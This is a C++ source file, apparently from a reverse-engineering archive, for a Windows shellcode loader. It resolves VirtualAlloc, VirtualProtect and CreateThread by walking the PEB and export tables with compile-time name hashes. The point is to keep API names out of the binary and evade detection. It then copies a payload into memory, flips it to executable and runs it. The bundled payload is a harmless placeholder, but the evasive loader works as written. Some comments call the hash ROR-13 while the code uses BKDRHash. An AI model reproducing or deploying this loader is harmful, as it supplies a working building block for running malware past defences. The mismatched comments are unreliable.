/*
    Shellcode Loader
    Archive of Reversing.ID

    Resolve function by walking PEB module list and PE export table.
    Function is identified by ROR-13 hash of its name.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /std:c++14 /Tpcode.cpp

Technique:
    - access:       BKDRHash
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateThread

Note:
    - ensure to use C++14 standard for support of loop in constexpr
    - resolve_hash_from_base: walk export table of a single module base.
    - resolve_hash: discover modules via PEB InMemoryOrderModuleList,
      then delegate to resolve_hash_from_base (no LoadLibrary/GetModuleHandle).
*/

#include <windows.h>
#include <stdint.h>

/* ========= PEB / loader structures ========= */
typedef struct _MY_UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY        InLoadOrderLinks;
    LIST_ENTRY        InMemoryOrderLinks;
    LIST_ENTRY        InInitializationOrderLinks;
    PVOID             DllBase;
    PVOID             EntryPoint;
    ULONG             SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/* ========= function signatures ========= */
typedef LPVOID WINAPI VirtualAlloc_t(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   WINAPI VirtualProtect_t(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   WINAPI VirtualFree_t(LPVOID, SIZE_T, DWORD);
typedef HANDLE WINAPI CreateThread_t(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  WINAPI WaitForSingleObject_t(HANDLE, DWORD);

typedef VirtualAlloc_t        FAR * pVirtualAlloc;
typedef VirtualProtect_t      FAR * pVirtualProtect;
typedef VirtualFree_t         FAR * pVirtualFree;
typedef CreateThread_t        FAR * pCreateThread;
typedef WaitForSingleObject_t FAR * pWaitForSingleObject;


/* =================== hash and resolvers =================== */

/*
    BKDRHash algorithm:

    constexpr single-expresison recursion (C++11)
    Calculate hash of a string at compile time 
    and the string literal never appears in the compiled binary.
*/
constexpr DWORD calculate_hash (const char * name)
{
    DWORD seed  = 131;
    DWORD state = 0;

    while (*name)
    {
        const uint8_t c = (uint8_t) *name;
        state = (state * seed) + c;    

        ++name;
    }
    return state;
}

/*
    Walk the PE export table of a single loaded module and return the
    function address whose export name matches target_hash (ROR-13).
    base is the module image base (HMODULE / DllBase); no loader APIs used.
    Returns NULL if the module has no export directory or no matching name.
*/
static FARPROC resolve_hash_from_base (PVOID base, DWORD target_hash)
{
    PBYTE                   image = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos   = (PIMAGE_DOS_HEADER) image;
    PIMAGE_NT_HEADERS       nt    = (PIMAGE_NT_HEADERS) (image + dos->e_lfanew);
    DWORD                   exp_rva;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD  * names;
    WORD   * ordinals;
    DWORD  * funcs;
    DWORD    i;

    exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exp_rva == 0)
        return NULL;

    exp      = (PIMAGE_EXPORT_DIRECTORY) (image + exp_rva);
    names    = (DWORD *) (image + exp->AddressOfNames);
    ordinals = (WORD *)  (image + exp->AddressOfNameOrdinals);
    funcs    = (DWORD *) (image + exp->AddressOfFunctions);

    for (i = 0; i < exp->NumberOfNames; i++)
    {
        const char * fn_name = (const char *) (image + names[i]);
        if (calculate_hash (fn_name) == target_hash)
            return (FARPROC) (image + funcs[ordinals[i]]);
    }

    return NULL;
}

/*
    Resolve a function across all loaded modules by walking
    PEB->Ldr->InMemoryOrderModuleList and calling resolve_hash_from_base
    for each DllBase. Avoids LoadLibrary/GetModuleHandle so no module-name
    strings are required. Returns NULL if not found in any loaded module.
*/
static FARPROC resolve_hash (DWORD target_hash)
{
    PMY_PEB_LDR_DATA ldr;
    PLIST_ENTRY      list;
    PLIST_ENTRY      entry;

    // read PEB.Ldr from thread-local segment register
#ifdef _WIN64
    ldr = *(PMY_PEB_LDR_DATA *) (__readgsqword (0x60) + 0x18);
#else
    ldr = *(PMY_PEB_LDR_DATA *) (__readfsdword (0x30) + 0x0C);
#endif

    list  = &ldr->InMemoryOrderModuleList;
    entry = list->Flink;

    // iterate through the module list
    while (entry != list)
    {
        PMY_LDR_ENTRY mod = CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks);
        FARPROC         result;

        // resolve the hash from the module base
        if (mod->DllBase != NULL)
        {
            result = resolve_hash_from_base (mod->DllBase, target_hash);
            if (result != NULL)
                return result;
        }
        entry = entry->Flink;
    }
    return NULL;
}


int main ()
{
    void *  runtime     = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // function pointers resolved at runtime
    pVirtualAlloc           fn_VirtualAlloc;
    pVirtualProtect         fn_VirtualProtect;
    pVirtualFree            fn_VirtualFree;
    pCreateThread           fn_CreateThread;
    pWaitForSingleObject    fn_WaitForSingleObject;

    // compile-time hash constants: constexpr forces evaluation at compile time,
    // so these function name strings are never embedded in the binary.
    constexpr DWORD hash_VirtualAlloc        = calculate_hash ("VirtualAlloc");
    constexpr DWORD hash_VirtualProtect      = calculate_hash ("VirtualProtect");
    constexpr DWORD hash_VirtualFree         = calculate_hash ("VirtualFree");
    constexpr DWORD hash_CreateThread        = calculate_hash ("CreateThread");
    constexpr DWORD hash_WaitForSingleObject = calculate_hash ("WaitForSingleObject");

    // resolve functions by hash
    fn_VirtualAlloc        = (pVirtualAlloc)        resolve_hash (hash_VirtualAlloc);
    fn_VirtualProtect      = (pVirtualProtect)      resolve_hash (hash_VirtualProtect);
    fn_VirtualFree         = (pVirtualFree)         resolve_hash (hash_VirtualFree);
    fn_CreateThread        = (pCreateThread)        resolve_hash (hash_CreateThread);
    fn_WaitForSingleObject = (pWaitForSingleObject) resolve_hash (hash_WaitForSingleObject);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fn_VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval = fn_VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = fn_CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        fn_WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    fn_VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}
